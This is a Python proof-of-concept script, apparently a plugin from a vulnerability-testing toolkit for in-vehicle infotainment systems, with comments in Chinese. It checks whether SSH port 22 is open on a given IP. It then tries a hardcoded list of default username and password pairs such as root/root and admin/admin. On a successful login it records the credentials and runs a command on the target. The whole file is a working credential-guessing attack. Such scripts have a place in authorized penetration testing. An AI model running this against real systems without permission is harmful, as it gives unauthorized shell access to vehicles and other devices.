"""
PoC Name: SSH Weak Credentials
CVE: N/A
Component: SSH Service (OpenSSH/Dropbear)
Category: Network
Severity: High
CVSS: 8.0
Description: 对IVI系统SSH服务进行弱口令检测,使用常见的车机默认账号密码组合。
Prerequisites: 目标SSH端口(22)开放, 需要paramiko库。
Usage: python3 28_SSH_Weak_Creds.py <target_ip>
"""
import socket
import sys
from iv_plugin_base import IVIVulnerabilityPlugin

class SSHWeakCredsPlugin(IVIVulnerabilityPlugin):
    CRED_LIST = [
        ("root", "root"), ("root", "123456"), ("root", "admin"),
        ("root", "password"), ("root", "toor"), ("root", ""),
        ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
        ("root", "12345678"), ("root", "default"), ("user", "user"),
    ]

    def check_prerequisites(self):
        if not self.target_ip:
            raise RuntimeError("需要指定目标IP地址。")
        return True

    def exploit(self):
        port = 22
        self.logger.info(f"检测SSH弱口令 {self.target_ip}:{port}...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if s.connect_ex((self.target_ip, port)) != 0:
                self.logger.info("SSH端口22关闭")
                self.results["vulnerable"] = False
                s.close()
                return self.results
            s.close()
        except:
            self.results["vulnerable"] = False
            return self.results

        self.logger.info("SSH端口开放,开始弱口令测试...")
        try:
            import paramiko
            for user, passwd in self.CRED_LIST:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(self.target_ip, port=port, username=user,
                                   password=passwd, timeout=3, banner_timeout=3)
                    self.logger.warning(f"[+] 发现弱口令: {user}/{passwd}")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = f"SSH login: {user}/{passwd}"
                    stdin, stdout, stderr = client.exec_command("id")
                    self.logger.info(f"    命令输出: {stdout.read().decode().strip()}")
                    client.close()
                    return self.results
                except paramiko.AuthenticationException:
                    continue
                except Exception:
                    break
            self.logger.info("所有弱口令测试失败,未发现弱口令")
            self.results["vulnerable"] = False
        except ImportError:
            self.logger.error("paramiko未安装,跳过SSH弱口令测试")
            self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 28_SSH_Weak_Creds.py <target_ip>")
        sys.exit(1)
    plugin = SSHWeakCredsPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
